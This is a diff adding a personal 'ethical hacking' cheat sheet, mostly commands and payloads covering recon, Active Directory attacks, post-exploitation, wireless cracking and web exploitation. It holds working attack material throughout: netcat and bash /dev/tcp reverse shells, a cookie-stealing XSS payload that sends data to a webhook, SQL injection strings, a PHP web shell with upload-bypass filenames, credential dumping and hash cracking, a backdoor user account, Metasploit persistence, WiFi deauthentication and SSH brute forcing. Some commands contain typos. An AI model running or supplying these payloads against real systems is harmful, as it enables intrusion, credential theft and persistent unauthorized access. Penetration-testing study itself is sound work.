@@ -1,0 +1,346 @@
+▶ Five Stage of Ethical Hacking : Recon > Scanning and Enumeration (Nmap, Nessus, Nikto) > Exploitation > Maintaining Access > Covering Tracks
+▶ Stage of Ethical Hacking : Recon > Weaponization > Delivary > Exploitation > Installation > Command and Control > Action on Objections
+
+▶ Recon
+
+Target Validation : whois, nslookup, dnsrecon
+Finding Subdomain : google Fuzzing, dig, nmap, amass, sublist3r, subfinder, findomain, crt.sh etc
+FingerPrinting : Nmaap, Wappalyzer, Whatweb, Builtwith, Netcat
+Data Breaches : HaveIBeenpwned, Breach-Parse, Weleakinfo
+
+Online:
+https://taksec.github.io/google-dorks-bug-bounty/
+https://nitinyadav00.github.io/Bug-Bounty-Search-Engine/
+https://dorks.faisalahmed.me/#
+https://thegrayarea.tech/5-google-dorks-every-hacker-needs-to-know-fed21022a906
+https://hazanasec.github.io/2021-03-11-Dorking-on-Steriods/
+https://mr-koanti.github.io/github.html
+https://mr-koanti.github.io/shodan
+https://www.lopseg.com.br/osint
+https://husseinphp.github.io/
+
+https://hunter.io
+https://hunter.how
+https://shodan.io
+
+https://github.com/hmaverickadams/breach-parse
+
+subfinder -d <link>
+sublist3r -d <link>
+amass enum -d <link>
+ffuf -w /path/to/wordlist -u https://FUZZ.target
+
+▶ Scanning and Enum
+
+arp-scan -l
+ifconfig
+netdiscover -r 127.0.0.0/24
+nmap -T4 -p- -A <ip>
+nmap -sU -T4 -p- <ip>
+nikto -h <link>
+dirsearch/dirb, origin ip, waf, Searchsploit, Nessus
+
+nmap <subdomain.com>
+nmap <subdomain.com> -p 80,443,22
+nmap <subdomain.com> -sV
+nmap <subdomain.com> -sS
+nmap <subdomain.com> -sU
+nmap <subdomain.com> --script=vuln
+nmap <subdomain.com> --script=enum
+
+
+▶ Web Application Enum
+
+Install go : https://github.com/Dewalt-arch/pimpmykali
+
+assetfinder tesla.com
+assetfinder tesla.com | tee x.txt
+assetfinder --subs-only tesla.com
+
+bgp.he.net
+amass enum -d <link> -o x.txt
+amass enum -list
+amass enum -passive -norecursive -noalts -d target.com -o sub-list.txt
+amass intel -ip -d target.com
+amass enum -active -d target.com -o sub-list.txt
+amass intel -whois -addr <target IP address>
+amass enum -d target.com -o sub-list.txt
+amass intel -include <target domain name> -whois -src -active -o online-assets.txt
+amass viz -d target.com -o target.png
+amass config
+
+cat domains.txt
+cat domains.txt | httprobe
+cat domains.txt | httprobe -s -p http:443
+cat domains.txt | httprobe -p http:81 -p https:8443
+cat domains.txt | httprobe -c 50
+
+
+▶ Exploitation
+
+https://www.revshells.com/
+https://tex2e.github.io/reverse-shell-generator/index.html
+https://weibell.github.io/reverse-shell-generator/
+
+1st terminal : nc -nvlp 4444
+2nd terminal : nc 192.168.57.139 4444 -e /bin/bash
+
+
+
+▶ Attacking Active directory:
+
+Lab : https://kamran-bilgrami.medium.com/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f
+https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019
+https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022
+
+
+
+apt install crackmapexec
+crackmapexec smb 192.168.1.10/24 -u <username> -d MARVEL.local -p password1
+crackmapexec smb 192.168.1.10/24 -u <username> -d MARVEL.local -p password1 --sam
+psexec.py marvel/<username>:password1@<ip>
+
+secretsdump.py marvel/<username>:password1@<ip>
+
+NTLM : john hash.txt --wordlist=rockyou.txt
+NTLM : john --format=NT hash.txt
+NTLM : john --wordlist=rockyou.txt --format=NT hash.txt
+NTLM : hashcat -m 1000 -a 0 filename rockyou.txt  [1000 = NTLM]
+NTLM : hashcat64.exe -m 1000 hash.txt rockyou.txt
+
+crackmapexec smb 192.168.1.10/24 -u <username> -H <hash> --local-auth
+
+https://www.pentesteracademy.com/activedirectorylab
+https://blog.harmj0y.net/
+https://adsecurity.org/
+https://github.com/gentilkiwi/mimikatz
+https://web.archive.org/web/20230326231931/https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/
+
+▶ Post Exploitation
+
+▶▶ File Transfer Review
+Certutil : certuti;/exe -urlcache -f http://10.10.10.10/file.txt file.txt
+http : python -m SimpleHTTPServer 80
+Browser : Navigate directly to file
+Ftp : python -m pyftpdlib 21
+ftp 10.10.10.10
+Linux : wget
+
+▶▶ Maintaining Access
+Persistance Scripts:
+run persistence -h
+exploit/windows/local/persistence
+exploit/windows/local/registry_persistence
+
+Scheduled Tasks:
+run scheduleme
+run schtaskabuse
+
+Add a user:
+net user hacker password123 /add
+
+msfconsole
+use exploit/windows/smb/psexec
+options
+set rhosts <ip>
+set smbdomain marvel.local
+set smbpass Password1
+set smbuser <name>
+set payload windows/x64/meterpreter/reverse_tcp
+set host eth0
+options
+set target 2
+run
+
+▶▶ CleanUp
+* Make the system/network as it was when you entered it 
+--> Remove executables,scripts and added files
+--> Remove malware, rootkits and added  user avvounts
+--> Set settings back to orginal configurations
+
+▶ Wireless Penetration Testing
+
+iwconfig
+ifconfig wlan0 down
+ifconfig wlan0 up
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng wlan0
+airodump-ng --bssid <MAC> --channel <CH> --write Filename wlan0
+aireplay-ng --deauth 0 -a <MAC> -c <Client_MAC> wlan0
+
+<Restart Your Vmware>
+aircrack-ng "cap file path" -w "pass file" wlan0
+
+
+▶ Find and Exploit Common Web Vulnerabilities:
+
+▶▶ SQLI:
+admin' or 1=1#
+admin' or 1=1-- -
+admin' union select null,null,null# [3 columns]
+admin' union select null,null,table_name from information_schema.tables#
+admin' union select null,null,column_name from information_schema.columns#
+admin' union select null,null,password from table name#
+
+▶▶ Blind Sql:
+
+--> First give user name and password and intercept with Burp
+--> then find the user name and password and try to encoded with various method
+--> copy the request and paste to req.txt
+--> sqlmap -r req.txt
+--> sqlmap -r req.txt --level=2 --dump
+--> sqlmap -r req.txt --level=2 --dump -T <table name>
+
+▶▶ XSS:
+alert(1)
+print(1)
+prompt("Hello")
+<img src=x onerror="prompt(1)">
+<img src=x onerror="window.location.href="<link>">
+"><img/src/onerror=import('//domain/')>"@gmail.com
+<script>alert(document.cookie)</script>
+<script>var i = new image; i.src="link from webhook"+document.cookie;</script>
+
+▶▶ Command Line Injection:
+
+; ls -la
+&& ls -la
+; ls -la #
+| ls -la
+
+www.abc.con; whoami;asd
+
+▶▶ Burp Alternative : https://webhook.site/
+
+python3 -m http.server 8080
+
+Bash TCP:
+bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
+/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
+
+▶▶ Insecure File Upload:
+
+Common File UPload Extention Insecure File Upload: .NET .action, .asa, .asax, .ascx, .ashx, .asmx, .asp, .aspq, .aspx, .axd, .cer, .cfc, .cfchart, .cfm, .cfml, .cfr, .cgi, .coffee, .coffeec, .config, .cs, .cshtm, .cshtml, .csproj, .ctp, .dbm, .do, .dot, .ecr, .ejs, .es, .es6, .fti, .ftl, .haml, .handlebars, .handlebars.coffee, .handlebars.ecr, .handlebars.litcoffee, .hogan, .hogan.coffee, .hogan.ecr, .hogan.litcoffee, .hphp, .htaccess, .inc, .jade, .js, .jsm, .jsp, .jspf, .jspx, .jst, .jst.coffee, .jst.ecr, .jst.litcoffee, .jsv, .jsw, .less, .litcoffee, .marko, .master, .mjs, .module, .mustache, .mustache.js, .nunjucks, .pgif, .phar, .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .pht, .phtm, .phtml, .pl, .pug, .rem, .sass, .scaml, .shtml,.jsp, .slim, .sln, .soap, .ssi, .svc, .swf, .swig, .tpl, .tpl, .coffee, .tpl, .ecr, .tpl, .litcoffee, .vb, .vbhtm, .vbhtml, .vbproj, .volt, .wsdl, .wss, .xsd, .xsl, .yaws
+
+file.php%20
+file.php%0a
+file.php%00
+file.php%0d%0a
+file.php/
+file.php.\
+file.
+file.php
+file.pHp5
+file.png.php
+file.png.pHp5
+file.php#.png
+file.php%00.png
+file.php\x00.png
+file.php%0a.png
+file.php%0d%0a.png
+file.phpJunk123png
+file.png.jpg.php
+file.php%00.png%00.jpg
+
+--> You can Bruteforce with Burp which extention is allow in that server
+--> You can encoded by ascii and unicoded 
+
+Common php code :<?php system($_GET['cmd']); ?>
+ffuf -u http://localhost/FUZZ -w /usr/share/wordlists/dirb/common.txt
+execute command : www.abc.xyz/a.php?cmd=whoami
+
+* You can paste code in head of png code and filename:"logo.php"
+
+▶▶ Attacking Authentication:
+
+For password Bruteforcing:
+--> Find the web login page and give random username and pass
+--> intercept with Burp and find the username and password
+--> then send to intruder and select the wordlist and hit attack
+--> You can use grep option also
+
+--> first give wrong username and password and intercept the request and copy to file and svae it
+--> then if you want to find the username so use "username=FUZZ" or you want to find the password "password=FUZZ"
+--> ffuf -request req.txt -request-proto http -w /usr/share/seclists/Passwords/any txt file -fs 1814 
+
+▶▶ MFA:
+Resources : https://appsecexplained.gitbook.io/appsecexplained/common-vulns/authentication/attacking-mfa
+
+Bruteforce Limitation: 
+--> first give wrong username and password and intercept the request and copy to file and svae it
+--> then if you want to find the username so use "username=FUZZUSER" or you want to find the password "password=FUZZPASS"
+--> ffuf -request req.txt -request-proto http -mode clusterbomb -w pass.txt:FUZZPASS -w username.txt:FUZZUSER -fs 3376
+
+Best Resources : https://appsecexplained.gitbook.io/appsecexplained
+
+▶▶ IDOR:
+
+--> First Find any parameter and also any kind of id 
+--> Intercept with BurpSuite and Find Again
+--> you can use python code for creating a wordlist 
+--> it can use burp payload file and also ffuf
+--> ffuf -u "http://abc.xyz/a.php?account=FUZZ" -w x.txt -fs <size>
+--> ffuf -u "http://abc.xyz/a.php?account=FUZZ" -w x.txt -fs <size> | grep FUZZ
+
+--> python code
+for i in range(1, 1000):
+	print(i)
+
+▶▶ Capstone:
+
+--> Checking wappalzer, source code, nikto, nmap 
+--> ffuf -u http://localhost/capstone/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php -recursion
+--> File Upload Vulnerability Requrst Code:
+
+filename="logo.php"
+Content-Type: image/png
+
+<?php system($_GET['cmd']); ?>
+
+▶▶ Exploitation Basic:
+
+nc -lvp 4444 >>>>> nc 192.168.1.1 4444 -e /bin/sh
+Staged : windows/meterpreter_reverse_tcp
+Non Staged : windows/meterpreter/reverse_tcp
+searchspoilt <payload name>
+
+https://github.com/heltonWernik/OpenLuck
+
+hydra -l root -P /usr/share/wordlists/metasploit/unix_password.txt ssh://192.168.1.1:22 -t 4 -V
+
+msfconsole
+search ssh
+use auxiliary/scanner/ssh/ssh_login
+use username root
+set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
+set rhosts <ip>
+set threads 10
+set verbose true
+run
+
+▶▶ Advice:
+01. Always set goals for yourself and stay motivated
+02. Donot become complacent
+03. Never be afraid to afraid to apply to jobs you are unqualified for 
+04. Be willing to admit that you donot know
+05. We willing to prove yourself
+06. Determine what you want from a job and only apply to those that meet your ceiteria
+07. Strive to be the dumbest guy or girl in the goal
+08. Network, Network, Network
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
